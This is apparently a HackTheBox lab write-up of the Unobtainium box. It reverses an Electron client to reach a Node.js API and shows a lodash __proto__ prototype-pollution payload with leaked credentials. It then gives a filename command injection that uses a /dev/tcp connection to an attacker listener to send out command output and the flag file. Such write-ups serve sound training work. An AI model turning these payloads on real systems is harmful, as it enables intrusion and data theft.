---
title: "Unobtainium"
date: 2026-11-01 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, prototype-pollution, command-injection, nodejs, electron, kubernetes, api]
description: "Unobtainium is a Hard Linux box centred on Node.js and Kubernetes. A downloadable Electron chat client leaks a hidden REST API whose lodash _.merge follows __proto__, letting you self-grant an upload permission; the unlocked endpoint then command-injects through an abandoned npm module, giving root code execution inside a Kubernetes pod and the user flag. This post covers recon through the user flag."
---

## Overview

Unobtainium is a Hard Linux machine built around a Node.js chat application and a Kubernetes cluster. The frontend serves a downloadable Electron client (deb/rpm/snap); reversing it exposes a backend REST API on port 31337. That API merges untrusted JSON with lodash, so a `__proto__` payload self-grants the `canUpload` flag, and the unlocked `/upload` endpoint shells out through a vulnerable `google-cloudstorage-commands` module. The result is root command execution inside a Kubernetes pod, where `user.txt` lives. This post stops at the user flag.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 80   | Apache (Electron client download page) |
| 8443 | Kubernetes API server (HTTPS only) |
| 31337| Node.js REST API (returns an empty JSON array) |

```bash
nmap -sC -sV 10.129.11.7
```

Port 80 hosts a download page for the "unobtainium" chat app in three Linux package formats. Port 31337 answers JSON but looks empty, and port 8443 only speaks HTTPS — it's the Kubernetes API server. The interesting work is reversing the client to understand how it talks to 31337.

## Enumeration

Grab the Debian package, unpack it, and extract the Electron app source. A `.deb` is just an `ar` archive; the app code lives in an `app.asar` bundle:

```bash
wget http://10.129.11.7/downloads/unobtainium_debian.zip
unzip unobtainium_debian.zip
ar x unobtainium_1.0.0_amd64.deb && tar -xf data.tar.xz
sudo npm install -g asar
asar extract opt/unobtainium/resources/app.asar output/
```

The client JavaScript (`output/src/js/todo.js`) shows the API at `unobtainium.htb:31337`, with hard-coded credentials `felamos:Winter2021`, posting JSON to endpoints like `/todo`. The `/todo` endpoint reads a file and returns its contents — which conveniently lets you read the server's own source to find the real bugs:

```bash
curl -s http://10.129.11.7:31337/todo -H 'content-type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"index.js"}'
```

![source leak](/assets/Images/unobtainium-source-leak.png)

The leaked `index.js` reveals the whole design: the app merges the request body with lodash `_.merge`, gates `/upload` on a `user.canUpload` flag, and the upload handler passes a filename straight into `google-cloudstorage-commands`, an abandoned module that builds a shell command with `exec`.

## Foothold

**Step 1 — Prototype pollution.** lodash `_.merge` follows the special `__proto__` key, so merging `{"__proto__":{"canUpload":true}}` writes `canUpload` onto `Object.prototype`. Every object — including the user record the authorization check inspects — now answers "true". (The deployment runs several replicas behind the port, so send it a few times to poison each.)

```bash
curl -s -X PUT http://10.129.11.7:31337/ -H 'content-type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"x","__proto__":{"canUpload":true}}}'
```

**Step 2 — Command injection.** With `canUpload` granted, `/upload` is reachable, and its filename is concatenated into a shell command. Prefix it with `&` to run your own command. Output isn't returned, so exfiltrate over a raw `/dev/tcp` connection back to a listener:

```bash
nc -lvnp 9001 &
curl -s -X POST http://10.129.11.7:31337/upload -H 'content-type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& bash -c \"exec 3<>/dev/tcp/10.10.16.152/9001; { id; cat /root/user.txt; } >&3\""}'
```

The listener receives `uid=0(root)` — code execution as root, but inside a Kubernetes pod (the cluster, not the host).

![user flag](/assets/Images/unobtainium-user-flag.png)

## User flag

```bash
cat /root/user.txt   # HTB{...}
```

Root inside the foothold pod owns `user.txt`.

> Foothold complete. Privilege escalation — pivoting through the cluster's service-account tokens to cluster-admin and escaping to the host — is left as an exercise. This post stops at user.
